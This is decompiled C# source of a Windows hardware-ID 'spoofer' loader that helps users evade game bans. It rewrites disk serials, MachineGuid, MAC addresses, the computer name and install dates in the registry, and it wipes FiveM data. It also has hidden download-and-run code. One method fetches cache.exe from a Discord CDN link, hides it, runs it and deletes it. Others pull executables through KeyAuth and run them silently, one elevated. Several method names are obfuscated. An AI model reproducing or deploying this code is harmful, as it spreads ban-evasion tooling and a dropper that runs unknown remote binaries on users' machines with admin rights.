
// Type: Loader.Spoofer
// Assembly: Thunder Spoofer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6911BFCC-B15C-4BF6-865B-4753D2D18ED6
// Assembly location: C:\Users\ADIKIBERNITIKOS\Desktop\111\1_.exe

using Guna.UI2.WinForms;
using KeyAuth;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Security;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Loader
{
  public class Spoofer : UserControl
  {
    private List<Process> m_d = new List<Process>();
    private string m_c = "XB0L9";
    private string grwXIswrPv = "U6WF2";
    private static string pcname = Spoofer.rndString(4);
    public static Random random;
    private IContainer components;
    private Label label1;
    private Label label6;
    private Guna2Button guna2Button1;
    private Guna2Button guna2Button2;
    private Guna2Button guna2Button3;
    private Guna2Button guna2Button4;
    private Guna2Button guna2Button5;
    private Guna2Button guna2Button6;
    private Guna2Button guna2Button7;
    private Guna2Button guna2Button8;
    private Guna2Button guna2Button9;
    private Guna2PictureBox guna2PictureBox1;

    public Spoofer() => this.InitializeComponent();

    private void w(object sender, EventArgs e)
    {
      string path = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path))
        Directory.CreateDirectory(path);
      if (System.IO.File.Exists("C:\\Program Files\\Win64\\cache.exe"))
      {
        Process.Start("C:\\Program Files\\Win64\\cache.exe");
        Thread.Sleep(1000);
        System.IO.File.Delete("C:\\Program Files\\Win64\\cache.exe");
      }
      else
      {
        new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/953684464104513571/956446548160573450/cache.exe", "C:\\Program Files\\Win64\\cache.exe");
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\cache.exe", FileAttributes.Hidden);
        Thread.Sleep(1000);
        Process.Start("C:\\Program Files\\Win64\\cache.exe");
        Thread.Sleep(1000);
        System.IO.File.Delete("C:\\Program Files\\Win64\\cache.exe");
      }
    }

    public static bool SetMachineName(string newName)
    {
      RegistryKey localMachine = Registry.LocalMachine;
      RegistryKey subKey1 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName");
      subKey1.SetValue("ComputerName", (object) newName);
      subKey1.Close();
      RegistryKey subKey2 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName");
      subKey2.SetValue("ComputerName", (object) newName);
      subKey2.Close();
      RegistryKey subKey3 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\");
      subKey3.SetValue("Hostname", (object) newName);
      subKey3.SetValue("NV Hostname", (object) newName);
      subKey3.Close();
      return true;
    }

    private void am(object sender, EventArgs e)
    {
      Spoofer.SetMachineName("956F3A");
      if (MessageBox.Show("Name Spoofed, Do you want to restart your PC Now?", "Lean Woofer", MessageBoxButtons.YesNo) != DialogResult.Yes)
        return;
      Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
      {
        CreateNoWindow = true,
        UseShellExecute = false,
        ErrorDialog = false
      });
    }

    private void Spoofer_Load(object sender, EventArgs e)
    {
    }

    private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void guna2ToggleSwitch2_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void guna2ToggleSwitch3_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void guna2ToggleSwitch4_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void guna2ToggleSwitch5_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void guna2ToggleSwitch6_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void guna2Button4_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Nothing Selected !");
    }

    private void start_Click_1(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Spoofed Succesfuly");
    }

    public static void HWIDclick()
    {
      string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
      string str1 = (string) Registry.GetValue(keyName, "HwProfileGuid", (object) "default");
      string str2 = "{LegionOnTop-72597-62482-4194-844193755}";
      Registry.SetValue(keyName, "GUID", (object) str2);
      Registry.SetValue(keyName, "HwProfileGuid", (object) str2);
    }

    private void guna2Button9_Click(object sender, EventArgs e)
    {
      Spoofer.HWIDclick();
      int num = (int) MessageBox.Show("Spoofed HWID!", "Legion Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public static void Disk()
    {
      foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
      {
        foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
          if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
          {
            string s1 = "XB0L95MV9YE3IR";
            string s2 = "XB0L95MV9YE3IR";
            registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
            registryKey.SetValue("Identifier", (object) s1);
            registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
            registryKey.SetValue("SerialNumber", (object) s2);
          }
        }
      }
      foreach (string subKeyName in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
        Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + subKeyName, true).SetValue("Identifier", (object) "XB0L95MV-XB0L95MV-A");
    }

    public void wqyWTF47t0JP()
    {
      System.IO.File.WriteAllBytes("C:\\Volumeid.exe", Login.KeyAuthApp.download("829929"));
      new Process()
      {
        StartInfo = {
          FileName = "cmd.exe",
          CreateNoWindow = true,
          RedirectStandardInput = true,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          Verb = "runas",
          Arguments = ("/C cd C:/ && volumeid C: " + Spoofer.rndString(4) + "-" + Spoofer.rndString(4) + " -nobanner")
        }
      }.Start();
      if (!System.IO.File.Exists("C:\\Volumeid.exe"))
        return;
      System.IO.File.Delete("C:\\Volumeid.exe");
    }

    public static void Bnc4fHNVZ7Hf()
    {
      foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
      {
        foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
          if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
          {
            string s1 = "WNVPJ9MWE0G6FX";
            string s2 = "WNVPJ9MWE0G6FX";
            registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
            registryKey.SetValue("Identifier", (object) s1);
            registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
            registryKey.SetValue("SerialNumber", (object) s2);
          }
        }
      }
      foreach (string subKeyName in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
        Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + subKeyName, true).SetValue("Identifier", (object) ("WNVPJ9MW" + "-" + "WNVPJ9MW" + "-A"));
    }

    public static string RandomId(int length)
    {
      string str1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      string str2 = "";
      Random random = new Random();
      for (int index = 0; index < length; ++index)
        str2 += str1[random.Next(str1.Length)].ToString();
      return str2;
    }

    private void guna2Button3_Click(object sender, EventArgs e)
    {
      this.wqyWTF47t0JP();
      int num = (int) MessageBox.Show("Spoofed Volume Serial Number", "Legion Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public void xynwbyzia()
    {
      string tempPath = Path.GetTempPath();
      if (Process.GetProcessesByName(this.m_c + ".bat").Length != 0)
      {
        Thread.Sleep(5000);
        this.xynwbyzia();
      }
      else
        System.IO.File.Delete(tempPath + this.m_c + ".bat");
    }

    public static string GenerateDate(int size)
    {
      char[] chArray = new char[size];
      for (int index = 0; index < size; ++index)
        chArray[index] = "abcdef0123456789"[Spoofer.random.Next("abcdef0123456789".Length)];
      return new string(chArray);
    }

    public static void Logsclick()
    {
      string date = Spoofer.GenerateDate(8);
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("InstallDate", (object) date);
      registryKey.Close();
    }

    private void guna2Button1_Click(object sender, EventArgs e)
    {
      string tempPath = Path.GetTempPath();
      WebClient webClient = new WebClient();
      System.IO.File.WriteAllBytes(tempPath + this.grwXIswrPv + ".exe", Login.KeyAuthApp.download("011114"));
      Process.Start(tempPath + this.grwXIswrPv + ".exe");
      int num = (int) MessageBox.Show("Spoofed Bios", "Legion Woofer", MessageBoxButtons.OK);
    }

    private void guna2Button4_Click_1(object sender, EventArgs e)
    {
      Spoofer.InstallDate();
      int num = (int) MessageBox.Show("Spoofed Last Logs ", "Legion Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public static void Enable_LocalAreaConection(string adapterId, bool enable = true)
    {
      foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
      {
        if (networkInterface.Id == adapterId)
        {
          ProcessStartInfo processStartInfo = new ProcessStartInfo("netsh", "interface set interface \"" + networkInterface.Name + "\" " + (!enable ? "disable" : nameof (enable)));
          Process process = new Process();
          process.StartInfo = processStartInfo;
          process.Start();
          process.StartInfo.CreateNoWindow = true;
          process.WaitForExit();
          break;
        }
      }
    }

    public static string RandomMac()
    {
      string str1 = "ABCDEF0123456789";
      string str2 = "26AE";
      string str3 = "";
      Random random = new Random();
      string str4 = str3 + str1[random.Next(str1.Length)].ToString() + str2[random.Next(str2.Length)].ToString();
      for (int index = 0; index < 5; ++index)
        str4 = str4 + "-" + str1[random.Next(str1.Length)].ToString() + str1[random.Next(str1.Length)].ToString();
      return str4;
    }

    public static bool x9WBy16uhpC0()
    {
      bool flag = false;
      foreach (string subKeyName in Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}").GetSubKeyNames())
      {
        if (subKeyName != "Properties")
        {
          try
          {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\" + subKeyName, true);
            if (registryKey.GetValue("BusType") != null)
            {
              registryKey.SetValue("NetworkAddress", (object) Spoofer.RandomMac());
              string adapterId = registryKey.GetValue("NetCfgInstanceId").ToString();
              Spoofer.Enable_LocalAreaConection(adapterId, false);
              Spoofer.Enable_LocalAreaConection(adapterId);
            }
          }
          catch (SecurityException ex)
          {
            return true;
          }
        }
      }
      return flag;
    }

    public static string rndString(int length) => new string(Enumerable.Repeat<string>("0123456789", length).Select<string, char>((Func<string, char>) (s => s[Spoofer.random.Next(s.Length)])).ToArray<char>());

    public static void cvxOUtsw4Z()
    {
      RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
      registryKey1.SetValue("ComputerName", (object) ("LEGION-" + Spoofer.pcname));
      registryKey1.Close();
      RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", true);
      registryKey2.SetValue("NV Hostname", (object) ("LEGION-" + Spoofer.pcname));
      registryKey2.Close();
      RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", true);
      registryKey3.SetValue("Hostname", (object) ("LEGION-" + Spoofer.pcname));
      registryKey3.Close();
      RegistryKey registryKey4 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", true);
      registryKey4.SetValue("ComputerName", (object) ("LEGION-" + Spoofer.pcname));
      registryKey4.Close();
      string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
      using (RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey(name, true))
        registryKey5.DeleteSubKeyTree("RegisteredOwner", false);
      RegistryKey registryKey6 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey6.SetValue("RegisteredOwner", (object) ("LEGION-" + Spoofer.pcname));
      registryKey6.Close();
    }

    private void guna2Button2_Click(object sender, EventArgs e)
    {
      Spoofer.x9WBy16uhpC0();
      int num = (int) MessageBox.Show("Spoofed MAC Adress", "Legion Wpoofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public static void IDclick()
    {
      string str = "EBB39-DAA7F-ABA35-FE4BE";
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("ProductID", (object) str);
      registryKey.Close();
    }

    public static void PCclick()
    {
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
      registryKey.SetValue("ComputerName", (object) "DESKTOP-2129BA");
      registryKey.Close();
    }

    public static void NetWoof()
    {
      List<Process> processList = new List<Process>();
      string path1 = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (!System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
      {
        string path2 = "C:\\Program Files\\Win64\\net.bat";
        using (StreamWriter text = System.IO.File.CreateText(path2))
          text.WriteLine("netsh int ip reset");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        processList.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
        process.Start();
        Thread.Sleep(500);
        System.IO.File.Delete("C:\\Program Files\\Win64\\net.bat");
      }
      else
      {
        Process.Start("C:\\Program Files\\Win64\\net.bat");
        System.IO.File.Delete("C:\\Program Files\\Win64\\net.bat");
      }
    }

    public static void FiveM()
    {
      string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      if (Directory.Exists(folderPath1 + "\\DigitalEntitlements"))
        Directory.Delete(folderPath1 + "\\DigitalEntitlements", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\crashes"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\crashes", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\logs"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\logs", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\data\\cache"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\data\\cache", true);
      Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\data\\server-cache");
      if (!Directory.Exists(folderPath2 + "\\CitizenFX"))
        return;
      Directory.Delete(folderPath2 + "\\CitizenFX", true);
    }

    public static void InstallDate()
    {
      string str = "1187b19b";
      RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true).SetValue(nameof (InstallDate), (object) str);
    }

    public static void Diskclick()
    {
      foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
      {
        foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
          if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
          {
            string s1 = "XB0L95MV9YE3IR";
            string s2 = "XB0L95MV9YE3IR";
            registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
            registryKey.SetValue("Identifier", (object) s1);
            registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
            registryKey.SetValue("SerialNumber", (object) s2);
          }
        }
      }
    }

    public static void CuzqxhGdB1ly()
    {
      string str = Guid.NewGuid().ToString();
      RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", true).SetValue("MachineGuid", (object) str);
    }

    public static void e1VQVLbWdLng()
    {
      string date = Spoofer.GenerateDate(8);
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("InstallDate", (object) date);
      registryKey.Close();
    }

    public void ZylLF00l2wNH()
    {
      if (MessageBox.Show("Do you want to restart your PC?", "Medusa Spoofer", MessageBoxButtons.YesNo) != DialogResult.Yes)
        return;
      Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
      {
        CreateNoWindow = true,
        UseShellExecute = false,
        ErrorDialog = false
      });
    }

    public static void XBOXclick()
    {
      string str = "40438d3e";
      RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true).SetValue("InstallDate", (object) str);
    }

    private void guna2Button8_Click(object sender, EventArgs e)
    {
      this.wqyWTF47t0JP();
      Spoofer.x9WBy16uhpC0();
      Spoofer.Bnc4fHNVZ7Hf();
      Spoofer.CuzqxhGdB1ly();
      Spoofer.e1VQVLbWdLng();
      Spoofer.cvxOUtsw4Z();
      int num = (int) MessageBox.Show("Spoofed PC", "Legion Spoofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      this.ZylLF00l2wNH();
    }

    public static void ClickUnban()
    {
      List<Process> processList = new List<Process>();
      new d().b();
      string path1 = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
      {
        Process.Start("C:\\Program Files\\Win64\\net.bat");
      }
      else
      {
        string path2 = "C:\\Program Files\\Win64\\net.bat";
        using (StreamWriter text = System.IO.File.CreateText(path2))
          text.WriteLine("netsh int ip reset");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        processList.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
        process.Start();
      }
      Spoofer.HWIDclick();
      Spoofer.Logsclick();
      Spoofer.PCclick();
      Spoofer.Diskclick();
      Spoofer.FiveM();
    }

    private void guna2Button7_Click(object sender, EventArgs e)
    {
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", (object) "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", (object) "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", (object) "1");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", (object) "2000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "2000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 1, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", (object) 6, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", (object) 0, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", (object) "Medium", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "0", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "400");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "400");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "5000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
